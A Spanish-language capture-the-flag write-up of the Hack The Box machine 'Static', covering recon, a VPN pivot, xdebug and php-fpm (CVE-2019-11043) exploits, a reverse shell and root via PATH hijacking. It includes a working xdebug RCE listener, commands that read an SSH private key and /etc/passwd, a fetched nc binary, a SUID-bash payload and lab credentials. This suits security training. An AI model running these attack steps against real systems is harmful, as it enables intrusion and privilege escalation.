---
layout: single
title: HTB-Static
excerpt: "WriteUp con metodología de la máquina Static."
date: 2021-12-15
classes: wide
header:
  icon: /assets/images/hackthebox.webp
  teaser_home_page: true
  teaser: /assets/images/WriteUps/Static.png
categories:
  - WriteUps
tags:
  - HTB

---


<center><img src='/assets/images/WriteUps/Static.png'></center>

IP -> 10.10.10.246

# Reconocimiento
## Nmap
Utilizamos [nmap](/Nmap/) y obtenemos los siguientes resultados.

[Static Nmap Result](/assets/files/WriteUps/Static.txt)

## http
El robots, nos reporta 2 rutas.

> /.ftp_uploads/
> /vpn/

Descargamos el archivo "db.sql.gz" para analizarlo. Nos dice que está corrupto. Tenemos que restaurarlo.

### db.sql.gz

Mediante la herramienta [fixgz](/fixgz/) restauramos el archivo y lo extraemos.
Al abrir el archivo db.sql, vemos credenciales. Tratamos de romper el hash por fuerza bruta.

> USER: admin
> HASH: d033e22ae348aeb5660fc2140aec35850c4da997 (restored)
> PASS: admin
> TOTP: orxxi4c7orXWwzlo

## http
En la página "/vpn/" iniciamos sesión pero tenemos que proporcionar un 2FA. 
Buscamos "google authenticator addon firefox" para poner el OTP y obtener el código.

> Iniciamos sesión

Al poner el nombre "web" en el formulario, y darla a generar. Nos crea un archivo ovpn. Al abrirlo vemos que intenta conectarse a "vpn.static.ovpn". Añadimos el dominio al /etc/hosts y nos conectamos a la vpn.

Al intentar comunicarnos con los distintos segmentos, nos damos cuenta que no tenemos acceso a algunos, para ello añadimos el segmento 172.20.0.0/24 al [IP-Route](/IP-Route/). Sin proporcionar ip del router.

> Tenemos traza con el segmento 172.20.0.0/24

# 172.20.0.10, 192.168.254.2
## nmap
22 - ssh
80 - http

## http
Vemos un archivo info.php.

> disable_functions -> Podemos subir una webShell
> xdebug 2.6.0 -> xdebug github exploit -> Podemos intentar conseguir RCE.

Aunque el script no nos decodifica el base64, modificamos el script.

```python
#!/usr/bin/env python2

import socket, re, pdb
from base64 import b64decode

ip_port = ('0.0.0.0', 9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
	client_data = conn.recv(1024)
	
	base64_response = re.findall(r'CDATA\[(.*?)\]', client_data)[0]
	try:
		command_output = b64decode(base64_response)
		print(command_output)
	except:
		pass
	
	data = raw_input ('>> ')
	conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
```

> Tenemos shell en php

## OS (php)
```bash
whoami
pwd
hostname -I
ls /home
ls /home/www-data
ls /home/www-data/.ssh
cat /home/www-data/.ssh/id_rsa
```

> Tenemos conexión con la 192.168.254.3
> id_rsa

Al intentar usar la id_rsa, no conseguimos conectarnos. Pero al utilizar el servicio ssh por el puerto 2222. Nos conecta

## OS (ssh 2222)

```bash
ls /home
cat user.txt
id
sudo -l
uname -a
cat /etc/os-release
cd /var/www/html
cd vpn
grep -r -i -E "user|pass|key"
ifconfig
```

> user.txt

> Linux 4.19
> Ubuntu 18.04.4

> USER: root
> PASS: 2108@C00l
> DB: static

```bash
ping -c 1 192.168.254.3
wget -qO- http://192.168.254.3
```

Local port forwarding por **ssh**.

```bash
ssh -i id_rsa www-data@10.10.10.246 -p 2222 -L 80:192.168.254.3:80
```

# 192.168.254.3
## http
En el servicio http, vemos una respuesta rara en un index.php
Fuzzeamos el servicio con herramientas como [wfuzz](/wfuzz/) o [gobuster](/gobuster/) en busca de directorios y de archivos con extensión php.
En las cabeceras de respuesta vemos que utiliza "php-fpm/7.1" buscamos en google "php-fpm/7.1 exploit github". Y encontramos un exploit.

> [GitHub Exploit](https://github.com/theMiddleBlue/CVE-2019-11043)

```bash
python exploit.py --url http://127.0.0.1/index.php --verbose
```

> Nos sube una webShell

Comprobamos si tenemos traza con mediante un ping. Pero no. Aunque la 192.168.254.2 si que responde.

Podemos enviarnos una reverse shell desde la "192.168.254.3" a la "192.168.254.2". Para ello necesitamos subir un binario estático de **nc**.

```bash
wget https://github.com/yunchih/static-binaries/raw/master/nc
scp -P 2222 -i id_rsa nc www-data@10.10.10.246:/tmp/nc

chmod +x ./nc
nc -nlvp 4646
```

Y nos enviamos una reverse shell con **python3** ya que está instalado en la "192.168.254.3"

## OS
```bash
find \-perm -4000 2>/dev/null
getcap -r / 2>/dev/null
```

> ersatool tiene capability para cambiar el UID

Subimos un binario **pspy** para monitorizar tareas que se ejecuten en segundo plano.
Vemos que cuando utilizamos el **ersatool**, pòr detrás se ejecuta el **openssl** de forma relativa. Podemos hacer un "path hijacking".

```bash
cd /tmp
touch openssl
chmod +x openssl
```

```bash
#!/bin/bash
chmod 4755 /bin/bash
```

```bash
export PATH=/tmp:$PATH
ersatool
create
asdasd

bash -p

cat /root/root.txt
```

> root.txt

# 172.20.0.11
## nmap
22 - ssh
3306 - mySQL

```bash
mysql -uroot -p -h 172.20.0.11
2108@C00l
```
```sql
show databases;
use static;
show tables;
describe users;
select * from users;
select load_file("/etc/passwd");
```
